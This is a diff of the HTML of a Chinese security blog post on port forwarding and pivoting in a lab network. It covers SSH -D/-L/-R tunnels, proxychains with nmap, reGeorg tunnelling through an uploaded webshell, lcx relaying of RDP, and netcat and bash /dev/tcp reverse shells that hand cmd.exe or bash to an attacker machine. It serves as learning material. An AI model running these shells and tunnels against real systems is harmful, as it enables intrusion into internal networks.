@@ -10,7 +10,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="端口转发的学习">
 <meta property="og:url" content="http://yoursite.com/2018/10/17/端口转发的学习/index.html">
-<meta property="og:site_name" content="c1y2m3‘s Blog">
+<meta property="og:site_name" content="c1y2m3’blog">
 <meta property="og:description" content="空闲之余,故学习下端口转发的原理和实践以便日后查看。 首先，区分下正向代理和反向代理  A  -B  -C  A对C的请求, B作为代理 ，代替A去访问C，并将结果返回给A, 所以B是 正向代理 , 简单的来说 就类似于访问Google的原理 。  反向代理 ,当 AB之前 有防火墙，, 不允许 A连B，但是允许B连A ，通常出现于内网环境。 首先  开两台实验机：A（172.28.100.51）">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bc5ea2e50f8dd1574b1cb73">
@@ -18,7 +18,7 @@
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bc6a5069b521a22ef61ccf8">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bc69ffb9b521a22ef610f9b">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bc6b065db5aa603f192deee">
-<meta property="og:updated_time" content="2018-11-18T16:51:23.000Z">
+<meta property="og:updated_time" content="2018-11-19T04:13:47.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="端口转发的学习">
 <meta name="twitter:description" content="空闲之余,故学习下端口转发的原理和实践以便日后查看。 首先，区分下正向代理和反向代理  A  -B  -C  A对C的请求, B作为代理 ，代替A去访问C，并将结果返回给A, 所以B是 正向代理 , 简单的来说 就类似于访问Google的原理 。  反向代理 ,当 AB之前 有防火墙，, 不允许 A连B，但是允许B连A ，通常出现于内网环境。 首先  开两台实验机：A（172.28.100.51）">
@@ -108,7 +108,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188"><span class="toc-number">1.</span> <span class="toc-text">ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用SSH隧道-B作为正向代理，-做动态端口转发"><span class="toc-number">1.</span> <span class="toc-text">利用SSH隧道,B作为正向代理， 做动态端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-2-D-2333-rootk-172-28-100-188"><span class="toc-number">2.</span> <span class="toc-text">ssh -2 -D 2333 rootk@172.28.100.188</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vim-etc-proxychains-conf"><span class="toc-number">3.</span> <span class="toc-text">vim /etc/proxychains.conf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用ssh隧道，B作为正向代理，进行单一的端口转发"><span class="toc-number">4.</span> <span class="toc-text">利用ssh隧道，B作为正向代理，进行单一的端口转发 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188"><span class="toc-number">5.</span> <span class="toc-text"> ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssl-L-2222-172-28-100-155-22-rootk-172-28-100-188"><span class="toc-number">6.</span> <span class="toc-text">ssl -L 2222:172.28.100.155:22 rootk@172.28.100.188</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用ssh隧道，B做反向代理，做单一的端口转发"><span class="toc-number">7.</span> <span class="toc-text">利用ssh隧道，B做反向代理，做单一的端口转发 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-R-7777-172-28-100-155-80-root-172-28-100-51"><span class="toc-number">8.</span> <span class="toc-text">ssh -R 7777:172.28.100.155:80 root@172.28.100.51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reGeorg"><span class="toc-number">9.</span> <span class="toc-text">reGeorg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows下-的端口转发"><span class="toc-number">10.</span> <span class="toc-text">Windows下 的端口转发 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux下的使用："><span class="toc-number">11.</span> <span class="toc-text">Linux下的使用：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lcx转发："><span class="toc-number">12.</span> <span class="toc-text">lcx转发：</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -127,7 +127,7 @@
 
     <div class="meta">
       <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-        <span itemprop="name">c1y2m3‘s Blog</span>
+        <span itemprop="name">c1y2m3’blog</span>
       </span>
       
     <div class="postdate">
@@ -151,55 +151,49 @@
 <p>反向代理 ,当 AB之前 有防火墙，, 不允许 A连B，但是允许B连A ，通常出现于内网环境。</p>
 <p>首先 </p>
 <p>开两台实验机：<br>A（172.28.100.51） Kali 具有攻击环境<br>B (172.28.100.188) 用来代理的服务端<br>C (172.28.100.155)   web内网主机 </p>
-<p>#####利用SSH隧道,B作为正向代理， 做动态端口转发</p>
-<p>在A上面运行：</p>
-<p>#####<code>ssh -2 -D 2333 rootk@172.28.100.188</code><br>这条命令是将A本地的2333端口，与B的22端口建立Socks连接。</p>
+<h2 id="利用SSH隧道-B作为正向代理，-做动态端口转发"><a href="#利用SSH隧道-B作为正向代理，-做动态端口转发" class="headerlink" title="利用SSH隧道,B作为正向代理， 做动态端口转发"></a>利用SSH隧道,B作为正向代理， 做动态端口转发</h2><p>在A上面运行：</p>
+<h2 id="ssh-2-D-2333-rootk-172-28-100-188"><a href="#ssh-2-D-2333-rootk-172-28-100-188" class="headerlink" title="ssh -2 -D 2333 rootk@172.28.100.188"></a><code>ssh -2 -D 2333 rootk@172.28.100.188</code></h2><p>这条命令是将A本地的2333端口，与B的22端口建立Socks连接。</p>
 <p>如果需要访问C的80端口，  浏览器需要侦听127.0.0.1：2333 socks代理 </p>
 <p>直接在A扫描C的端口 ，调用proxychains 侦听 127.0.0.1 2333</p>
-<p>#####<code>vim /etc/proxychains.conf</code></p>
-<p>!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc5ea2e50f8dd1574b1cb73" alt=""></p>
-<p>#####<code>proxychains nmap -Pn -sT 172.28.100.155</code></p>
-<p>#####利用ssh隧道，B作为正向代理，进行单一的端口转发 </p>
-<h5 id="ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188"><a href="#ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188" class="headerlink" title="ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188"></a><code>ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188</code></h5><p>同理，需要设置socks代理 ， 127.0.0.1 1111</p>
+<h2 id="vim-etc-proxychains-conf"><a href="#vim-etc-proxychains-conf" class="headerlink" title="vim /etc/proxychains.conf"></a><code>vim /etc/proxychains.conf</code></h2><p>!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc5ea2e50f8dd1574b1cb73" alt=""></p>
+<p><code>proxychains nmap -Pn -sT 172.28.100.155</code></p>
+<h2 id="利用ssh隧道，B作为正向代理，进行单一的端口转发"><a href="#利用ssh隧道，B作为正向代理，进行单一的端口转发" class="headerlink" title="利用ssh隧道，B作为正向代理，进行单一的端口转发 "></a>利用ssh隧道，B作为正向代理，进行单一的端口转发 </h2><h2 id="ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188"><a href="#ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188" class="headerlink" title=" ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188"></a> <code>ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188</code></h2><p>同理，需要设置socks代理 ， 127.0.0.1 1111</p>
 <p>A访问127.0.0.1:1111 相当于访问C的 80端口 </p>
 <p>!!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc5edcd2711cd136d9f68e1" alt=""></p>
-<p>#####<code>ssl -L 2222:172.28.100.155:22 rootk@172.28.100.188</code></p>
-<p>A访问 127.0.0.1:2222 相当与访问172.28.100.155:22 (C) 中间需要<a href="mailto:rootk@172.28.100.188" target="_blank" rel="noopener">rootk@172.28.100.188</a> (B)来转发。</p>
-<p>#####利用ssh隧道，B做反向代理，做单一的端口转发<br>A访问127.0.0.1:8888 相当于访问C的80端口</p>
-<p>#####<code>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</code></p>
-<p>#####<code>ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</code></p>
+<h2 id="ssl-L-2222-172-28-100-155-22-rootk-172-28-100-188"><a href="#ssl-L-2222-172-28-100-155-22-rootk-172-28-100-188" class="headerlink" title="ssl -L 2222:172.28.100.155:22 rootk@172.28.100.188"></a><code>ssl -L 2222:172.28.100.155:22 rootk@172.28.100.188</code></h2><p>A访问 127.0.0.1:2222 相当与访问172.28.100.155:22 (C) 中间需要<a href="mailto:rootk@172.28.100.188" target="_blank" rel="noopener">rootk@172.28.100.188</a> (B)来转发。</p>
+<h2 id="利用ssh隧道，B做反向代理，做单一的端口转发"><a href="#利用ssh隧道，B做反向代理，做单一的端口转发" class="headerlink" title="利用ssh隧道，B做反向代理，做单一的端口转发 "></a>利用ssh隧道，B做反向代理，做单一的端口转发 </h2><p>A访问127.0.0.1:8888 相当于访问C的80端口</p>
+<p><code>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</code></p>
+<p><code>ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</code></p>
 <p>实验中常出现密钥写入的问题 ，很鸡肋。</p>
 <p>在B上运行： 172.28.100.188</p>
-<p>#####<code>ssh -R 7777:172.28.100.155:80 root@172.28.100.51</code></p>
-<p>B主动去ssh连接，将来自(A)172.28.100.51:8888 的 请求转化成（C）172.28.100.155:80的请求，然后将结果通过ssh隧道，返回给A</p>
+<h2 id="ssh-R-7777-172-28-100-155-80-root-172-28-100-51"><a href="#ssh-R-7777-172-28-100-155-80-root-172-28-100-51" class="headerlink" title="ssh -R 7777:172.28.100.155:80 root@172.28.100.51"></a><code>ssh -R 7777:172.28.100.155:80 root@172.28.100.51</code></h2><p>B主动去ssh连接，将来自(A)172.28.100.51:8888 的 请求转化成（C）172.28.100.155:80的请求，然后将结果通过ssh隧道，返回给A</p>
 <p>!!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc6a5069b521a22ef61ccf8" alt=""></p>
-<p>##reGeorg</p>
-<p>Git项目地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a> </p>
+<h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p>Git项目地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a> </p>
 <p><code>reGeorg利用webshell建立一个socks代理进行内网穿透，服务器必须支持aspx、php、jsp、js等web语言。</code></p>
 <p>连接172.28.100.188的webshell，上传tunnel.php和 tunnel.nosocket.php 到web目录 </p>
 <p>在 A(Kali）上面去运行 </p>
 <p><code>python reGeorgSocksProxy.py -p 9999 -u http://172.28.100.188/tunnel.nosocket.php</code></p>
 <p>此时会利用172.28.100.188的web服务，与本机的9999端口建立socks代理，就可以用A去打C了。 </p>
 <p>!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc69ffb9b521a22ef610f9b" alt=""></p>
-<p>#####Windows下 的端口转发 </p>
-<p>#####nc反弹</p>
+<h2 id="Windows下-的端口转发"><a href="#Windows下-的端口转发" class="headerlink" title="Windows下 的端口转发 "></a>Windows下 的端口转发 </h2><p>nc反弹</p>
 <p>正向连接</p>
 <p>在内网执行</p>
-<p>#####<code>nc -l -p 5555 -t -e cmd.exe</code><br>-t是通过telne模式执行 cmd.exe 程序，可以省略。</p>
-<p>在公网执行:</p>
-<p>#####<code>nc -nvv 192.168.8.135 5555</code></p>
+<p><code>nc -l -p 5555 -t -e cmd.exe</code></p>
+<p>-t是通过telne模式执行 cmd.exe 程序，可以省略。</p>
+<p>在公网执行:<br><code>nc -nvv 192.168.8.135 5555</code></p>
 <p>反向连接：</p>
-<p>公网：</p>
-<p>#####<code>nc -lp 5555</code></p>
+<p>公网：<br><code>nc -lp 5555</code></p>
 <p>在内网机器反弹 #<code>nc -t -e cmd 192.168.8.135 5555</code></p>
-<p>####Linux下的使用：</p>
-<p>攻击机:nc -vlp 9999</p>
+<h2 id="Linux下的使用："><a href="#Linux下的使用：" class="headerlink" title="Linux下的使用："></a>Linux下的使用：</h2><p>攻击机:nc -vlp 9999</p>
 <p>目标机:bash -i &gt;&amp; /dev/tcp/192.168.8.145/9999 0&gt;&amp;1</p>
-<p>#####lcx转发：</p>
-<p>内网：172.28.100.89  开有3389的机器<br>公网:172.28.100.58</p>
+<p>命令 ： bash -i 产生一个交互式bash </p>
+<blockquote>
+<p>&amp; /dev/tcp/ip/port 建立给TCP连接，把标准输出和错误重定向到TCP连接<br>0&gt;&amp;1  从TCP连接获取输入 。</p>
+</blockquote>
+<h2 id="lcx转发："><a href="#lcx转发：" class="headerlink" title="lcx转发："></a>lcx转发：</h2><p>内网：172.28.100.89  开有3389的机器<br>公网:172.28.100.58</p>
 <p>由于是本地实验，故拿内网环境充当公网ip，所以正常的情况下，内网可以正常访问公网，而公网环境不能访问内网。</p>
 <p>内网上执行:lcx.exe -slave 公网IP+端口 内网IP+端口</p>
-<p>#####<code>lcx.exe –slave 172.28.100.58 4444 172.28.100.89 3389</code></p>
+<p><code>lcx.exe –slave 172.28.100.58 4444 172.28.100.89 3389</code></p>
 <p>将内网的3389转发到公网的4444端口 。</p>
 <p>公网上执行 <code>lcx.exe -listen 4444 5555</code></p>
 <p>此时内网已把 3389端口转发到公网的5555端口，可以通过127.0.0.1:5555 去连接远程客户端 。</p>
@@ -229,7 +223,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188"><span class="toc-number">1.</span> <span class="toc-text">ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用SSH隧道-B作为正向代理，-做动态端口转发"><span class="toc-number">1.</span> <span class="toc-text">利用SSH隧道,B作为正向代理， 做动态端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-2-D-2333-rootk-172-28-100-188"><span class="toc-number">2.</span> <span class="toc-text">ssh -2 -D 2333 rootk@172.28.100.188</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vim-etc-proxychains-conf"><span class="toc-number">3.</span> <span class="toc-text">vim /etc/proxychains.conf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用ssh隧道，B作为正向代理，进行单一的端口转发"><span class="toc-number">4.</span> <span class="toc-text">利用ssh隧道，B作为正向代理，进行单一的端口转发 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188"><span class="toc-number">5.</span> <span class="toc-text"> ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssl-L-2222-172-28-100-155-22-rootk-172-28-100-188"><span class="toc-number">6.</span> <span class="toc-text">ssl -L 2222:172.28.100.155:22 rootk@172.28.100.188</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用ssh隧道，B做反向代理，做单一的端口转发"><span class="toc-number">7.</span> <span class="toc-text">利用ssh隧道，B做反向代理，做单一的端口转发 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-R-7777-172-28-100-155-80-root-172-28-100-51"><span class="toc-number">8.</span> <span class="toc-text">ssh -R 7777:172.28.100.155:80 root@172.28.100.51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reGeorg"><span class="toc-number">9.</span> <span class="toc-text">reGeorg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows下-的端口转发"><span class="toc-number">10.</span> <span class="toc-text">Windows下 的端口转发 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux下的使用："><span class="toc-number">11.</span> <span class="toc-text">Linux下的使用：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lcx转发："><span class="toc-number">12.</span> <span class="toc-text">lcx转发：</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
